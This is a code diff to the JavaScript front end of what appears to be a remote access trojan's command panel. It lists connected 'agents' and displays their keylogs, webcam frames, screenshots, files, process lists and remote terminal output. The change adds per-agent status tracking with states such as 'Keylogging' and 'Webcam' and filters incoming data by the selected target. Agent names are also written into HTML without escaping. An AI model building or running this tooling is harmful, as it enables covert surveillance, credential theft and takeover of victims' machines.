@@ -295,6 +295,14 @@
             }
         });
 
+        connection.on("AgentStatusUpdate", function (agentId, status) {
+            let agent = connectedAgents.find(a => a.id === agentId);
+            if (agent) {
+                agent.status = status;
+                renderAgentList();
+            }
+        });
+
         // Background check for 60s timeout
         setInterval(function() {
             let now = Date.now();
@@ -325,10 +333,9 @@
                 const li = document.createElement("li");
                 li.className = "nav-item";
                 
-                // Show online status: < 30s = Online (success), > 30s = Away (warning)
-                let isAway = agent.lastHeartbeat && (now - agent.lastHeartbeat > 30000);
-                let badgeClass = isAway ? "bg-warning" : "bg-success";
-                let statusText = isAway ? "Away" : "Online";
+                // Show status: Connected, Keylogging, Webcam, etc.
+                let statusText = agent.status || "Connected";
+                let badgeClass = statusText === "Connected" ? "bg-success" : "bg-primary";
 
                 li.innerHTML = `<a class="nav-link ${agent.id === currentTargetId ? 'active' : ''}" href="#" onclick="selectAgent('${agent.id}', '${agent.name}')">
                     🖥️ ${agent.name} <span class="badge ${badgeClass} float-end">${statusText}</span>
@@ -360,6 +367,7 @@
         }
         
         connection.on("ReceiveProcesses", function(targetId, jsonArray) {
+            if (targetId !== currentTargetId) return;
             const processes = JSON.parse(jsonArray);
             const tbody = document.getElementById("process-table-body");
             tbody.innerHTML = "";
@@ -380,6 +388,7 @@
         }
 
         connection.on("ReceiveApplications", function(targetId, jsonArray) {
+            if (targetId !== currentTargetId) return;
             const apps = JSON.parse(jsonArray);
             const tbody = document.getElementById("app-table-body");
             tbody.innerHTML = "";
@@ -415,12 +424,14 @@
         }
 
         connection.on("ReceiveScreenshot", function(targetId, base64Image) {
+            if (targetId !== currentTargetId) return;
             if(base64Image) {
                 document.getElementById("screenshot-img").src = "data:image/jpeg;base64," + base64Image;
             }
         });
 
         connection.on("ReceiveWebcams", function(targetId, jsonArray) {
+            if (targetId !== currentTargetId) return;
             const cameras = JSON.parse(jsonArray);
             const selectEl = document.getElementById("webcam-select");
             selectEl.innerHTML = '<option value="">Default Camera</option>';
@@ -445,6 +456,7 @@
         }
         
         connection.on("ReceiveWebcamFrame", function(targetId, base64Image) {
+            if (targetId !== currentTargetId) return;
             if(base64Image) {
                 document.getElementById("webcam-img").src = "data:image/jpeg;base64," + base64Image;
             }
@@ -462,6 +474,7 @@
         }
 
         connection.on("ReceiveKeylog", function(targetId, keys) {
+            if (targetId !== currentTargetId) return;
             const consoleEl = document.getElementById("keylog-console");
             let currentText = consoleEl.textContent;
             
@@ -555,6 +568,7 @@
         }
 
         connection.on("ReceiveDirectoryContents", function(targetId, path, jsonStr) {
+            if (targetId !== currentTargetId) return;
             const isModal = activeExplorer === "modal";
             
             if (isModal) {
@@ -692,6 +706,7 @@
         }
         
         connection.on("ReceiveFile", async function(targetId, fileName, base64Data) {
+            if (targetId !== currentTargetId) return;
             document.getElementById("file-download-status").textContent = "File received: " + fileName + ". Waiting for save location...";
             
             try {
@@ -768,6 +783,7 @@
         }
 
         connection.on("ReceiveTerminalOutput", function(targetId, output) {
+            if (targetId !== currentTargetId) return;
             const outEl = document.getElementById("terminal-output");
             outEl.textContent = outEl.textContent.replace("Running...", "");
             outEl.textContent += `\n${output}\n`;
